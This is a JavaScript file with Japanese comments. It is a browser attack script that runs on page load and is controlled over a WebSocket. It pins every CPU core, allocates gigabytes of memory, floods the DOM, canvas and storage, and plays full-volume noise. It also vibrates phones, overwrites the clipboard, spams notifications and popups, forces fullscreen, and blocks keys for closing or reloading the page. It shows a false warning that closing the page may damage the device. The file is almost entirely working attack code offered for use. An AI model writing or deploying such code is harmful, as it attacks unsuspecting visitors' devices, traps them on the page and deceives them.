(function() {
    'use strict';

    let socket = null;
    let isAttacking = false;

    function connectWebSocket() {
        try {
            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
            socket = new WebSocket(protocol + location.host + '/ws');
            
            socket.onopen = () => {
                startAttack();
            };
            
            socket.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.command === 'attack') {
                        startAttack();
                    }
                    if (data.command === 'stop') {
                        isAttacking = false;
                    }
                } catch(err) {}
            };
            
            socket.onclose = () => {
                setTimeout(connectWebSocket, 1000);
            };
            
            socket.onerror = () => {
                socket.close();
            };
        } catch(e) {}
    }

    function startAttack() {
        if (isAttacking) return;
        isAttacking = true;
        
        cpuAttack();
        memoryAttack();
        gpuAttack();
        domAttack();
        storageAttack();
        audioAttack();
        vibrationAttack();
        clipboardAttack();
        notificationAttack();
        fullscreenAttack();
    }

    // CPU攻撃 - 全コア+メインスレッド完全飽和
    function cpuAttack() {
        const cores = navigator.hardwareConcurrency || 8;
        
        // メインスレッドを完全に占有
        function mainThreadLoad() {
            if (!isAttacking) return;
            
            const start = Date.now();
            
            // 100ms全力計算
            while (Date.now() - start < 100) {
                Math.sqrt(Math.random() * 999999);
                Math.pow(Math.random(), 10);
                Math.sin(Math.random() * 360);
                Math.cos(Math.random() * 360);
                Math.tan(Math.random() * 360);
                Math.log(Math.random() * 999999);
                Math.exp(Math.random() * 100);
                Math.atan2(Math.random(), Math.random());
                JSON.stringify({ data: Math.random().toString(36).repeat(100) });
            }
            
            setTimeout(mainThreadLoad, 0);
        }
        
        // 各コアに2つのWorker
        const workerCode = `
            let running = true;
            
            self.onmessage = (e) => {
                if (e.data === 'stop') running = false;
                if (e.data === 'start') running = true;
            };
            
            function heavyLoop() {
                if (!running) return;
                
                const start = Date.now();
                
                while (Date.now() - start < 200) {
                    Math.sqrt(Math.random() * 999999);
                    Math.pow(Math.random(), 10);
                    Math.sin(Math.random() * 360);
                    Math.cos(Math.random() * 360);
                    Math.tan(Math.random() * 360);
                    Math.log(Math.random() * 999999);
                    Math.exp(Math.random() * 100);
                    Math.atan2(Math.random(), Math.random());
                    
                    // 暗号化処理も追加
                    let hash = 0;
                    for (let i = 0; i < 1000; i++) {
                        hash = ((hash << 5) - hash) + Math.random() * 255;
                        hash = hash & hash;
                    }
                }
                
                setTimeout(heavyLoop, 0);
            }
            
            heavyLoop();
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        
        // 各コアに2つずつWorkerを作成
        for (let i = 0; i < cores * 2; i++) {
            try {
                const worker = new Worker(url);
                worker.postMessage('start');
            } catch(e) {}
        }
        
        mainThreadLoad();
    }

    // メモリ攻撃 - 一気にGB単位で確保
    function memoryAttack() {
        const memArrays = [];
        
        function allocateMemory() {
            if (!isAttacking) return;
            
            try {
                // 一気に200MB確保
                for (let i = 0; i < 20; i++) {
                    const buffer = new ArrayBuffer(1024 * 1024 * 10);
                    const view = new Uint8Array(buffer);
                    
                    // 全領域に書き込み
                    for (let j = 0; j < view.length; j += 50) {
                        view[j] = Math.random() * 255;
                    }
                    
                    memArrays.push(buffer);
                }
                
                // 200個(2GB)超えたら一部解放
                if (memArrays.length > 200) {
                    memArrays.splice(0, 50);
                }
            } catch(e) {
                // メモリ不足でも続行
                memArrays.length = 100;
            }
            
            setTimeout(allocateMemory, 10);
        }
        
        allocateMemory();
    }

    // GPU攻撃 - 影・グラデーション・大量描画
    function gpuAttack() {
        try {
            const canvases = [];
            
            // 複数のCanvasを作成
            for (let c = 0; c < 3; c++) {
                const canvas = document.createElement('canvas');
                canvas.width = 10000;
                canvas.height = 10000;
                canvas.style.display = 'none';
                document.body.appendChild(canvas);
                canvases.push(canvas);
            }
            
            function heavyDraw() {
                if (!isAttacking) return;
                
                canvases.forEach(canvas => {
                    const ctx = canvas.getContext('2d');
                    
                    // 大量の影付き描画
                    ctx.shadowBlur = 200;
                    ctx.shadowColor = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.8)`;
                    
                    for (let i = 0; i < 300; i++) {
                        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                        ctx.fillRect(
                            Math.random()*10000,
                            Math.random()*10000,
                            Math.random()*1000,
                            Math.random()*1000
                        );
                    }
                    
                    ctx.shadowBlur = 0;
                    
                    // 複雑なパス
                    for (let i = 0; i < 100; i++) {
                        ctx.beginPath();
                        ctx.moveTo(Math.random()*10000, Math.random()*10000);
                        
                        for (let j = 0; j < 100; j++) {
                            ctx.lineTo(Math.random()*10000, Math.random()*10000);
                        }
                        
                        ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                        ctx.lineWidth = Math.random() * 100;
                        ctx.stroke();
                    }
                    
                    // 大量のグラデーション
                    for (let i = 0; i < 50; i++) {
                        const grad = ctx.createRadialGradient(
                            Math.random()*10000, Math.random()*10000, 0,
                            Math.random()*10000, Math.random()*10000, 2000
                        );
                        grad.addColorStop(0, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`);
                        grad.addColorStop(0.5, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`);
                        grad.addColorStop(1, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0)`);
                        ctx.fillStyle = grad;
                        ctx.fillRect(0, 0, 10000, 10000);
                    }
                });
                
                setTimeout(heavyDraw, 0);
            }
            
            heavyDraw();
        } catch(e) {}
    }

    // DOM攻撃 - Shadow DOMも使って攻撃
    function domAttack() {
        const container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        
        function createElements() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 2000; i++) {
                    const el = document.createElement('div');
                    el.textContent = 'x'.repeat(Math.floor(Math.random() * 2000));
                    
                    // Shadow DOMも付ける
                    if (el.attachShadow) {
                        const shadow = el.attachShadow({ mode: 'open' });
                        shadow.innerHTML = '<div>' + 'x'.repeat(1000) + '</div>';
                    }
                    
                    el.style.cssText = `
                        position: absolute;
                        top: ${Math.random()*10000}px;
                        left: ${Math.random()*10000}px;
                        width: ${Math.random()*1000}px;
                        height: ${Math.random()*1000}px;
                        background: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                        opacity: ${Math.random()};
                        transform: rotate(${Math.random()*360}deg) scale(${Math.random()*10});
                        border: ${Math.random()*20}px solid rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                        box-shadow: ${Math.random()*100}px ${Math.random()*100}px ${Math.random()*100}px rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5);
                        filter: blur(${Math.random()*10}px);
                    `;
                    container.appendChild(el);
                }
                
                if (container.children.length > 10000) {
                    container.innerHTML = '';
                }
            } catch(e) {}
            
            setTimeout(createElements, 10);
        }
        
        createElements();
    }

    // ストレージ攻撃 - IndexedDBも使う
    function storageAttack() {
        // localStorage攻撃
        function fillLocalStorage() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 100; i++) {
                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(20000));
                }
                
                if (localStorage.length > 500) {
                    const keys = Object.keys(localStorage);
                    for (let i = 0; i < 100; i++) {
                        localStorage.removeItem(keys[i]);
                    }
                }
            } catch(e) {}
            
            setTimeout(fillLocalStorage, 50);
        }
        
        // IndexedDB攻撃
        function fillIndexedDB() {
            if (!isAttacking) return;
            
            try {
                const request = indexedDB.open('attack_db', 1);
                
                request.onsuccess = (e) => {
                    const db = e.target.result;
                    
                    for (let i = 0; i < 10; i++) {
                        const tx = db.transaction('store', 'readwrite');
                        const store = tx.objectStore('store');
                        store.put({ data: 'x'.repeat(100000) }, Math.random());
                    }
                };
                
                request.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    db.createObjectStore('store', { keyPath: 'id' });
                };
            } catch(e) {}
            
            setTimeout(fillIndexedDB, 100);
        }
        
        fillLocalStorage();
        fillIndexedDB();
    }

    // 音声攻撃 - 大音量で音を鳴らす
    function audioAttack() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            
            function playNoise() {
                if (!isAttacking) return;
                
                // ホワイトノイズ生成
                const bufferSize = audioContext.sampleRate * 2;
                const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
                const data = buffer.getChannelData(0);
                
                for (let i = 0; i < bufferSize; i++) {
                    data[i] = Math.random() * 2 - 1;
                }
                
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                
                const gain = audioContext.createGain();
                gain.gain.value = 1.0; // 最大音量
                
                source.connect(gain);
                gain.connect(audioContext.destination);
                
                source.loop = true;
                source.start();
                
                setTimeout(playNoise, 100);
            }
            
            playNoise();
        } catch(e) {}
    }

    // 振動攻撃 - スマホを振動させ続ける
    function vibrationAttack() {
        function vibrate() {
            if (!isAttacking) return;
            
            try {
                navigator.vibrate(1000);
                navigator.vibrate([500, 100, 500, 100, 500]);
            } catch(e) {}
            
            setTimeout(vibrate, 1000);
        }
        
        vibrate();
    }

    // クリップボード攻撃
    function clipboardAttack() {
        function writeClipboard() {
            if (!isAttacking) return;
            
            try {
                navigator.clipboard.writeText('x'.repeat(10000));
            } catch(e) {}
            
            setTimeout(writeClipboard, 500);
        }
        
        writeClipboard();
    }

    // 通知攻撃
    function notificationAttack() {
        function sendNotification() {
            if (!isAttacking) return;
            
            try {
                if (Notification.permission === 'granted') {
                    new Notification('警告', {
                        body: 'x'.repeat(500),
                        tag: Math.random().toString()
                    });
                } else if (Notification.permission !== 'denied') {
                    Notification.requestPermission();
                }
            } catch(e) {}
            
            setTimeout(sendNotification, 1000);
        }
        
        sendNotification();
    }

    // フルスクリーン攻撃 - 画面を占有
    function fullscreenAttack() {
        function requestFullscreen() {
            if (!isAttacking) return;
            
            try {
                document.documentElement.requestFullscreen();
                document.documentElement.webkitRequestFullscreen();
            } catch(e) {}
            
            setTimeout(requestFullscreen, 2000);
        }
        
        requestFullscreen();
    }

    // 離脱防止
    function preventLeave() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = 'このページを閉じると端末が破損する可能性があります';
        });
        
        document.addEventListener('keydown', (e) => {
            if (
                (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'r' || e.key === 'R')) ||
                (e.altKey && e.key === 'F4') ||
                e.key === 'F5' ||
                e.key === 'F12' ||
                e.key === 'Escape'
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);
        
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        
        // ポップアップ攻撃
        setInterval(() => {
            if (!isAttacking) return;
            
            try {
                const popup = window.open(
                    location.href,
                    '_blank',
                    `width=100,height=100,left=${Math.random()*screen.width},top=${Math.random()*screen.height}`
                );
                
                if (popup) {
                    popup.document.write('<html><body>Loading...</body></html>');
                }
            } catch(e) {}
        }, 2000);
    }

    function init() {
        connectWebSocket();
        preventLeave();
    }

    init();
})();
